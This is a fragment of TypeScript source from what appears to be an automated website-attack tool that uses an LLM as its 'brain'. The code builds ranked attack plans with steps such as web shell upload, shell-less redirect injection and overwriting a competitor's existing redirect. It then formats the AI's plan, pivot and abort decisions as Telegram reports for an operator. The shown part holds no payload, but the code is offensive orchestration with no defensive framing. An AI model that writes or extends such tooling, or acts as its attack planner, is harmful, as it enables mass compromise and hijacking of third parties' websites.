  // Priority 5: Generic methods
  if (ctx.existingRedirectDetected) {
    steps.push({ method: "competitor_overwrite", confidence: 40, reasoning: "Existing redirect — overwrite competitor", skipIfPreviousSuccess: true, estimatedTimeMs: 30000 });
  }

  steps.push({ method: "shell_upload", confidence: 25, reasoning: "Generic shell upload", skipIfPreviousSuccess: true, estimatedTimeMs: 30000 });
  steps.push({ method: "shellless_redirect", confidence: 20, reasoning: "Shellless redirect fallback", skipIfPreviousSuccess: true, estimatedTimeMs: 20000 });

  return {
    steps,
    overallReasoning: "Rule-based plan (LLM unavailable)",
    overallConfidence: Math.max(...steps.map(s => s.confidence), 10),
    estimatedTimeMs: steps.reduce((sum, s) => sum + (s.estimatedTimeMs || 30000), 0),
    shouldProceed: true,
  };
}

// ═══════════════════════════════════════════════════════
//  EXPORT: FORMAT AI DECISION FOR TELEGRAM
// ═══════════════════════════════════════════════════════

/**
 * Format AI decision เป็น human-readable สำหรับ Telegram
 */
export function formatBrainDecision(
  type: "plan" | "pivot" | "cost_benefit" | "cred_rank" | "redirect_method",
  data: AttackPlan | PivotDecision | CostBenefitAnalysis | any,
): string {
  switch (type) {
    case "plan": {
      const plan = data as AttackPlan;
      const stepsStr = plan.steps.slice(0, 8).map((s, i) =>
        `${i + 1}. ${s.method} (${s.confidence}%) — ${s.reasoning.substring(0, 60)}`
      ).join("\n");
      return `\u{1F9E0} AI Attack Plan (confidence: ${plan.overallConfidence}%)\n\n` +
        `${plan.overallReasoning.substring(0, 200)}\n\n` +
        `\u{1F4CB} Steps:\n${stepsStr}\n\n` +
        `\u23F1 Est. time: ${Math.round(plan.estimatedTimeMs / 1000)}s` +
        (plan.shouldProceed ? "" : `\n\u26A0\uFE0F ABORT: ${plan.abortReason}`);
    }
    case "pivot": {
      const pivot = data as PivotDecision;
      if (pivot.shouldAbort) return `\u{1F6D1} AI Brain: ABORT — ${pivot.reasoning}`;
      if (pivot.shouldPivot) return `\u{1F504} AI Pivot → ${pivot.newMethod} (${pivot.confidence}%)\n${pivot.reasoning}`;
      return `\u27A1\uFE0F AI: Continue current method — ${pivot.reasoning}`;
    }
    case "cost_benefit": {
      const cb = data as CostBenefitAnalysis;
      return cb.shouldContinue
        ? `\u2705 AI: Continue (${cb.confidence}%) — ${cb.timeVsReward}`
        : `\u{1F6D1} AI: Stop (${cb.confidence}%) — ${cb.reasoning}`;
    }
    default:
      return `\u{1F9E0} AI Decision: ${JSON.stringify(data).substring(0, 200)}`;
  }
}
